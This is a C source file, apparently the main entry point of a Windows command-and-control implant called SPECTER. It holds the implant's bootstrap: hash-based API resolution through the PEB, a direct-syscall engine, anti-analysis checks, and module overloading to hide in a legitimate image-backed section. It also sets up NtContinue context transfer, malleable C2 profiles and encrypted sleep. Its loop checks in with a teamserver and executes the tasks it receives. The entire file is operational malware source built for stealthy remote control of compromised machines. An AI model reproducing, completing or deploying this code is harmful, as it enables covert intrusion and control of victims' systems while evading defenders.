/**
 * SPECTER Implant — PIC Entry Point & Main Loop
 *
 * Position-independent entry. Resolves PEB, bootstraps the syscall
 * engine, initializes all subsystems (config, sleep, comms), and
 * enters the main callback loop.
 */

#include "specter.h"
#include "ntdefs.h"
#include "peb.h"
#include "syscalls.h"
#include "crypto.h"
#include "config.h"
#include "comms.h"
#include "sleep.h"
#include "evasion.h"
#ifndef SPECTER_BAREBONE
#include "antianalysis.h"
#endif
#include "profile.h"
#ifndef SPECTER_BAREBONE
#include "bus.h"
#endif
#include "task_exec.h"

/* Implant context — file-scope static, no extern cross-TU references.
   All subsystems receive a pointer to this via init functions. */
static IMPLANT_CONTEXT g_ctx;
#ifndef SPECTER_BAREBONE
static PROFILE_CONFIG g_profile_cfg;
#endif

/* Phase 0.4: Build flags marker (SPBF) removed.
   Anti-analysis and debug mode are now controlled entirely by compile-time
   flags (#ifdef SPECTER_DEV_BUILD) and the config TLV field (0x8A BUILD_FLAGS)
   which is parsed during cfg_init(). */

/* Forward declarations for cleanup */
static void implant_cleanup(void);
typedef void (__attribute__((ms_abi)) *fn_pic_entry)(PVOID param);

/* Lab sentinel used to prevent a copied module-overload instance from
   recursively overloading itself again. */
#define MODULE_OVERLOAD_TRANSFER_MAGIC    ((ULONG_PTR)0x53504D4FUL)
#define MODULE_OVERLOAD_RW_OFFSET         ((SIZE_T)0x19000)

typedef struct _MODULE_OVERLOAD_TRANSFER_INFO {
    ULONG_PTR magic;
    PVOID original_base;
    SIZE_T original_size;
} MODULE_OVERLOAD_TRANSFER_INFO;

/* Dev build: resolve ExitProcess + OutputDebugStringA for diagnostics */
#ifdef SPECTER_DEV_BUILD
typedef void (__attribute__((ms_abi)) *fn_ExitProcess)(DWORD code);
typedef void (__attribute__((ms_abi)) *fn_OutputDebugStringA)(const char *);
static fn_ExitProcess g_dev_exit = NULL;
static fn_OutputDebugStringA g_dev_dbg = NULL;

static void dev_exit(DWORD code) {
    if (g_dev_exit) g_dev_exit(code);
}

/* Emit a trace string visible in DebugView / WinDbg */
static void dev_trace(const char *msg) {
    if (g_dev_dbg) g_dev_dbg(msg);
}

/* Emit trace with a numeric value: "prefix: NNN" */
static void dev_trace_val(const char *prefix, DWORD val) {
    if (!g_dev_dbg) return;
    char buf[128];
    DWORD i = 0;
    const char *p = prefix;
    while (*p && i < 120) buf[i++] = *p++;
    buf[i++] = ':'; buf[i++] = ' ';
    /* Simple decimal conversion */
    char tmp[12];
    DWORD t = 0;
    if (val == 0) { tmp[t++] = '0'; }
    else { DWORD v = val; while (v) { tmp[t++] = '0' + (v % 10); v /= 10; } }
    while (t > 0 && i < 126) buf[i++] = tmp[--t];
    buf[i] = 0;
    g_dev_dbg(buf);
}

static void dev_init_exit(PVOID k32) {
    /* DJB2("ExitProcess") = 0x024773DE */
    g_dev_exit = (fn_ExitProcess)find_export_by_hash(k32, 0x024773DE);
    /* DJB2("OutputDebugStringA") = computed below */
    g_dev_dbg = (fn_OutputDebugStringA)find_export_by_hash(k32, HASH_OUTPUTDEBUGSTRINGA);
}
#define DEV_FAIL(code) do { dev_trace_val("SPECTER DEV_FAIL", code); dev_exit(code); return; } while(0)
#define DEV_TRACE(msg) dev_trace(msg)
#define DEV_TRACE_VAL(msg, val) dev_trace_val(msg, val)
#else
#define DEV_FAIL(code) return
#define DEV_TRACE(msg) ((void)0)
#define DEV_TRACE_VAL(msg, val) ((void)0)
#endif

__attribute__((section(".text$A")))
void implant_entry(PVOID param) {
    MODULE_OVERLOAD_TRANSFER_INFO *transfer_info =
        (MODULE_OVERLOAD_TRANSFER_INFO *)param;
    BOOL module_overload_transferred =
        (transfer_info && transfer_info->magic == MODULE_OVERLOAD_TRANSFER_MAGIC);
    NTSTATUS status;

    /* ---- Zero out global context ---- */
    spec_memset(&g_ctx, 0, sizeof(IMPLANT_CONTEXT));

    /* ---- Step 1: Verify PEB access ---- */
    PPEB peb = get_peb();
    if (!peb)
        DEV_FAIL(10);

    /* ---- Step 2: Resolve ntdll and kernel32 base addresses ---- */
    PVOID ntdll_base = find_module_by_hash(HASH_NTDLL_DLL);
    if (!ntdll_base)
        DEV_FAIL(11);

    PVOID k32_base = find_module_by_hash(HASH_KERNEL32_DLL);
#ifdef SPECTER_DEV_BUILD
    if (k32_base) dev_init_exit(k32_base);
#endif
    (void)k32_base;
    DEV_TRACE("[SPECTER] kernel32 + debug init OK");

    /* ---- Step 3: Initialize the syscall engine ---- */
    g_ctx.syscall_table = sc_get_table();
    status = sc_init(g_ctx.syscall_table);
    if (!NT_SUCCESS(status))
        DEV_FAIL(12);
    DEV_TRACE("[SPECTER] syscall engine OK");

    g_ctx.clean_ntdll = g_ctx.syscall_table->clean_ntdll;

    /* ---- Step 3a-pre: Module overloading (must happen early) ---- */
    /* If evasion_flags will be known from config, we check later.
       For now, attempt module overloading before evasion_init so that
       the implant can relocate into a clean backed section.  The
       evasion_flags check happens after config init; module overload
       is gated by a compile-time flag or early config peek. */

    /* ---- Step 3b: Initialize evasion engine ---- */
    status = evasion_init(&g_ctx);
    /* Evasion init failure is non-fatal — syscalls still work via
       raw spec_syscall fallback in evasion_syscall() */
    (void)status;

    /* ---- Step 3b.1: Initialize syscall wrappers with context ---- */
    syscall_wrappers_init(&g_ctx);

    if (module_overload_transferred && transfer_info->original_base) {
        PVOID free_base = transfer_info->original_base;
        SIZE_T free_size = 0;
        status = spec_NtFreeVirtualMemory(
            (HANDLE)-1,
            &free_base,
            &free_size,
            MEM_RELEASE
        );
        if (NT_SUCCESS(status)) {
            transfer_info->original_base = NULL;
            DEV_TRACE("[SPECTER] original private view released");
        } else {
            DEV_TRACE_VAL("[SPECTER] original private view release FAILED",
                          (DWORD)(status & 0xFFFF));
        }
    }

    /* ---- Step 3c: Anti-analysis checks ---- */
    /* Anti-analysis runs BEFORE config is loaded.  The compile-time
       SPECTER_DEV_BUILD flag gates this check.  Runtime skip via
       config BUILD_FLAGS TLV (0x8A) is available after cfg_init. */
#if !defined(SPECTER_DEV_BUILD) && !defined(SPECTER_BAREBONE)
    {
        ANTIANALYSIS_CONFIG aa_cfg;
        ANALYSIS_RESULT aa_result;
        antianalysis_default_config(&aa_cfg);
        ANALYSIS_TYPE aa_type = antianalysis_check(&g_ctx, &aa_cfg, &aa_result);
        if (aa_type != ANALYSIS_CLEAN) {
            antianalysis_respond(&g_ctx, aa_cfg.response);
            return;
        }
    }
#endif

    /* ---- Step 4: Initialize config store ---- */
    DEV_TRACE("[SPECTER] cfg_init...");
    status = cfg_init(&g_ctx);
    if (!NT_SUCCESS(status)) {
        DEV_TRACE_VAL("[SPECTER] cfg_init FAILED status", (DWORD)(status & 0xFFFF));
        /* Sub-codes: 130 = NULL ctx, 131 = no pic_base, 132 = blob not found,
           133 = decrypt fail, 134 = parse fail, 139 = other */
        if (status == 0xC0000002) DEV_FAIL(130);       /* STATUS_INVALID_PARAMETER */
        if (status == 0xC0000034) DEV_FAIL(132);       /* STATUS_OBJECT_NAME_NOT_FOUND */
        if (status == 0xC000003A) DEV_FAIL(133);       /* STATUS_OBJECT_PATH_NOT_FOUND (decrypt) */
        if (status == 0xC0000005) DEV_FAIL(134);       /* STATUS_ACCESS_VIOLATION (parse) */
        DEV_FAIL(139);
    }

    /* ---- Step 4b: Module overloading (post-config) ---- */
#if !defined(SPECTER_BAREBONE) || defined(SPECTER_BAREBONE_MODULE_OVERLOAD)
    {
        IMPLANT_CONFIG *icfg = cfg_get(&g_ctx);
        if (icfg && !module_overload_transferred &&
            (icfg->evasion_flags & EVASION_FLAG_MODULE_OVERLOAD)) {
            PVOID overload_base = NULL;
            SIZE_T overload_size = 0;
            EVASION_CONTEXT *ectx = (EVASION_CONTEXT *)g_ctx.evasion_ctx;
            status = evasion_module_overload(ectx, &overload_base, &overload_size);
            if (NT_SUCCESS(status) && overload_base) {
                /* Copy implant PIC blob into the module-backed section.
                   The implant is position-independent so it runs from
                   any base address. After copy, the original allocation
                   can be freed by the caller. */
                extern void implant_entry(PVOID);
                PVOID pic_base = (PVOID)implant_entry;
                SIZE_T pic_size = cfg_get_payload_size();
                if (pic_size == 0)
                    pic_size = CONFIG_SCAN_MAX;
                if (pic_size > overload_size)
                    pic_size = overload_size;
                PVOID copied_base = overload_base;
                SIZE_T copied_size = overload_size;

                if (icfg->evasion_flags & EVASION_FLAG_MODULE_PRESERVE_HEADERS) {
                    status = evasion_module_overload_find_exec_range(
                        overload_base,
                        overload_size,
                        pic_size,
                        &copied_base,
                        &copied_size
                    );
                    if (NT_SUCCESS(status)) {
                        DEV_TRACE("[SPECTER] module overload preserve headers");
                    } else {
                        copied_base = overload_base;
                        copied_size = overload_size;
                        DEV_TRACE_VAL("[SPECTER] module preserve headers unavailable",
                                      (DWORD)(status & 0xFFFF));
                    }
                }

                spec_memcpy(copied_base, pic_base, pic_size);

                status = evasion_module_overload_finalize_split(
                    ectx,
                    copied_base,
                    copied_size,
                    pic_size,
                    icfg->module_overload_rw_offset
                        ? (SIZE_T)icfg->module_overload_rw_offset
                        : MODULE_OVERLOAD_RW_OFFSET
                );
                if (!NT_SUCCESS(status))
                    DEV_TRACE_VAL("[SPECTER] module overload split protect FAILED",
                                  (DWORD)(status & 0xFFFF));

                if ((icfg->evasion_flags & EVASION_FLAG_MODULE_PRESERVE_HEADERS) &&
                    copied_base != overload_base) {
                    PVOID header_base = overload_base;
                    SIZE_T header_size = (SIZE_T)((BYTE *)copied_base - (BYTE *)overload_base);
                    DWORD old_protect = 0;
                    status = spec_NtProtectVirtualMemory(
                        (HANDLE)-1,
                        &header_base,
                        &header_size,
                        PAGE_READONLY,
                        &old_protect
                    );
                    if (!NT_SUCCESS(status))
                        DEV_TRACE_VAL("[SPECTER] module header protect FAILED",
                                      (DWORD)(status & 0xFFFF));
                }

                if (icfg->evasion_flags & EVASION_FLAG_MODULE_PATCH_ONLY) {
                    DEV_TRACE("[SPECTER] module overload patch-only canary");
                } else {
                    MODULE_OVERLOAD_TRANSFER_INFO transfer;
                    transfer.magic = MODULE_OVERLOAD_TRANSFER_MAGIC;
                    transfer.original_base = cfg_get_pic_base();
                    if (!transfer.original_base)
                        transfer.original_base = pic_base;
                    transfer.original_size = pic_size;

#ifndef SPECTER_BAREBONE
                    if (icfg->evasion_flags & EVASION_FLAG_NTCONTINUE_ENTRY) {
                        DEV_TRACE("[SPECTER] module overload NtContinue transfer");
                        status = evasion_ntcontinue_transfer(
                            ectx,
                            copied_base,
                            &transfer
                        );
                        DEV_TRACE_VAL("[SPECTER] NtContinue transfer FAILED",
                                      (DWORD)(status & 0xFFFF));
                    }
#endif

                    /* Lab transfer fallback: enter the copied PIC from the backed
                       image view. The copied view is split RX/RW using the current
                       lab build's mutable-state offset. */
                    DEV_TRACE("[SPECTER] module overload transfer");
                    ((fn_pic_entry)copied_base)(&transfer);
                    return;
                }
            }
        }

#ifndef SPECTER_BAREBONE
        /* NtContinue entry transfer: re-enter the main loop from a
           clean thread context with synthetic stack frames */
        if (icfg && (icfg->evasion_flags & EVASION_FLAG_NTCONTINUE_ENTRY)) {
            /* NtContinue transfer is deferred until after all init is
               complete — see below after comms_init.  Flag is checked
               after the main loop setup. */
        }
#endif
    }
#endif

#ifndef SPECTER_BAREBONE
    {
        IMPLANT_CONFIG *pcfg = cfg_get(&g_ctx);
        if (pcfg && (pcfg->evasion_flags & EVASION_FLAG_PDATA_REGISTER)) {
            EVASION_CONTEXT *ectx = (EVASION_CONTEXT *)g_ctx.evasion_ctx;
            PVOID pic_base_for_pdata = cfg_get_pic_base();
            status = evasion_register_pdata(ectx, pic_base_for_pdata);
            if (NT_SUCCESS(status))
                DEV_TRACE("[SPECTER] pdata registration OK");
            else
                DEV_TRACE_VAL("[SPECTER] pdata registration FAILED",
                              (DWORD)(status & 0xFFFF));
        }
    }
#endif

    /* ---- Step 5: Check kill date before proceeding ---- */
    if (cfg_check_killdate(&g_ctx))
        DEV_FAIL(14);

    /* ---- Step 6: Initialize sleep controller ---- */
    /* Skip full sleep init for dev builds or when debug flag is set
       (compile-time flag + config BUILD_FLAGS TLV after cfg_init). */
    {
        BOOL skip_sleep_init = FALSE;
#ifdef SPECTER_DEV_BUILD
        skip_sleep_init = TRUE;
#endif
        {
            IMPLANT_CONFIG *scfg = cfg_get(&g_ctx);
            if (scfg && (scfg->build_flags & BUILD_FLAG_DEBUG))
                skip_sleep_init = TRUE;
        }

        if (!skip_sleep_init) {
            status = sleep_init(&g_ctx);
            if (!NT_SUCCESS(status))
                DEV_FAIL(15);
        }
    }

    /* ---- Step 7: Initialize communications engine ---- */
    DEV_TRACE("[SPECTER] comms_init...");
    status = comms_init(&g_ctx);
    if (!NT_SUCCESS(status)) {
        DEV_TRACE_VAL("[SPECTER] comms_init FAILED status", (DWORD)(status & 0xFFFF));
        DEV_FAIL((DWORD)(status & 0xFFFF));
    }
    DEV_TRACE("[SPECTER] comms_init OK — first checkin succeeded");

    /* ---- Step 7a: Initialize module bus ---- */
#if !defined(SPECTER_BAREBONE) || defined(SPECTER_BAREBONE_MODULES)
    DEV_TRACE("[SPECTER] bus_init...");
    status = bus_init(&g_ctx);
    if (!NT_SUCCESS(status)) {
        DEV_TRACE_VAL("[SPECTER] bus_init FAILED", (DWORD)(status & 0xFFFF));
        /* Non-fatal: module execution won't work, but built-in tasks
           and legacy cmd execution still function. */
    } else {
        DEV_TRACE("[SPECTER] bus_init OK");

        /* Initialize guardian thread subsystem (VEH crash isolation) */
        status = guardian_init(&g_ctx);
        if (!NT_SUCCESS(status)) {
            DEV_TRACE_VAL("[SPECTER] guardian_init FAILED", (DWORD)(status & 0xFFFF));
        } else {
            DEV_TRACE("[SPECTER] guardian_init OK");
        }

        /* Initialize module lifecycle manager */
        status = modmgr_init(&g_ctx);
        if (!NT_SUCCESS(status)) {
            DEV_TRACE_VAL("[SPECTER] modmgr_init FAILED", (DWORD)(status & 0xFFFF));
        } else {
            DEV_TRACE("[SPECTER] modmgr_init OK");
        }
    }
#else
    g_ctx.module_bus = NULL;
    DEV_TRACE("[SPECTER] barebone build: module bus disabled");
#endif

    /* ---- Step 7b: Initialize malleable C2 profile (Phase 1.3 minimal bridge) ---- */
#ifndef SPECTER_BAREBONE
    {
        IMPLANT_CONFIG *cfg = cfg_get(&g_ctx);
        if (cfg && cfg->profile_blob && cfg->profile_blob_len > 0) {
            spec_memset(&g_profile_cfg, 0, sizeof(g_profile_cfg));
            status = profile_init(cfg->profile_blob, cfg->profile_blob_len, &g_profile_cfg);
            if (NT_SUCCESS(status)) {
                status = comms_set_profile(&g_ctx, &g_profile_cfg);
                if (NT_SUCCESS(status)) {
                    DEV_TRACE("[SPECTER] profile_init/comms_set_profile OK");
                } else {
                    DEV_TRACE_VAL("[SPECTER] comms_set_profile FAILED", (DWORD)(status & 0xFFFF));
                    DEV_TRACE("[SPECTER] falling back to legacy comms baseline");
                }
            } else {
                /* Operationally safe fallback: keep beacon alive on legacy comms path
                   when profile parse/transform metadata is invalid.
                   Does not catch runtime faults later in the profile chain — validate
                   against your beacon crash-repro checklist before production. */
                DEV_TRACE_VAL("[SPECTER] profile_init FAILED", (DWORD)(status & 0xFFFF));
                DEV_TRACE("[SPECTER] profile fallback to legacy comms baseline");
            }
        } else {
            DEV_TRACE("[SPECTER] no profile blob present; using legacy comms baseline");
        }
    }
#else
    DEV_TRACE("[SPECTER] barebone build: profile wire path disabled");
#endif

    /* ---- Step 8: Enter main loop ---- */
    g_ctx.running = TRUE;
    DWORD consecutive_failures = 0;

    while (g_ctx.running) {
        /* Perform encrypted check-in with teamserver */
        status = comms_checkin(&g_ctx);

        if (!NT_SUCCESS(status)) {
            consecutive_failures++;

            /* Try rotating to next channel on failure */
            comms_rotate_channel(&g_ctx);

            /* Check retry limit */
            IMPLANT_CONFIG *cfg = cfg_get(&g_ctx);
            if (cfg && cfg->max_retries > 0 &&
                consecutive_failures >= cfg->max_retries) {
                g_ctx.running = FALSE;
                break;
            }
        } else {
            consecutive_failures = 0;
        }

        /* Process received tasks from this checkin */
        if (g_ctx.pending_task_count > 0) {
            DEV_TRACE_VAL("[SPECTER] tasks received", g_ctx.pending_task_count);
            for (DWORD ti = 0; ti < g_ctx.pending_task_count; ti++) {
                execute_task(&g_ctx, &g_ctx.pending_tasks[ti]);
            }
            /* Free task data buffers and reset count */
            task_free_pending(&g_ctx);
        }

        /* If kill was received, send final checkin with results before exiting (Fix 5) */
        if (!g_ctx.running && g_ctx.task_result_count > 0) {
            DEV_TRACE("[SPECTER] sending final checkin before exit");
            comms_checkin(&g_ctx);
        }

        /* Check kill date */
        if (cfg_check_killdate(&g_ctx)) {
            g_ctx.running = FALSE;
            break;
        }

        /* Sleep with jitter and memory encryption.
           Debug mode (compile-time or runtime) uses a simple 5-second
           NtDelayExecution sleep instead of the full sleep_cycle. */
        {
            BOOL use_simple_sleep = FALSE;
#ifdef SPECTER_DEV_BUILD
            use_simple_sleep = TRUE;
#endif
            {
                IMPLANT_CONFIG *slp_cfg = cfg_get(&g_ctx);
                if (slp_cfg && (slp_cfg->build_flags & BUILD_FLAG_DEBUG))
                    use_simple_sleep = TRUE;
            }

            if (use_simple_sleep) {
                LARGE_INTEGER delay;
                delay.QuadPart = -50000000LL; /* 5 seconds in 100ns units */
                spec_NtDelayExecution(FALSE, &delay);
            } else {
                sleep_cycle(&g_ctx);
            }
        }
    }

    /* ---- Cleanup and exit ---- */
    implant_cleanup();
    return;
}

static void implant_cleanup(void) {
    /* Shut down module bus subsystems (kill running modules, remove VEH) */
#ifndef SPECTER_BAREBONE
    if (g_ctx.module_bus) {
        MODULE_MANAGER *mgr = modmgr_get();
        if (mgr)
            modmgr_shutdown(mgr);
        guardian_shutdown();
    }
#endif

    /* Free any remaining pending tasks and results */
    task_free_pending(&g_ctx);
    task_free_results(&g_ctx);

    /* Zero sensitive data from global context */
    IMPLANT_CONFIG *cfg = cfg_get(&g_ctx);
    if (cfg)
        spec_memset(cfg, 0, sizeof(IMPLANT_CONFIG));

    g_ctx.running = FALSE;
}
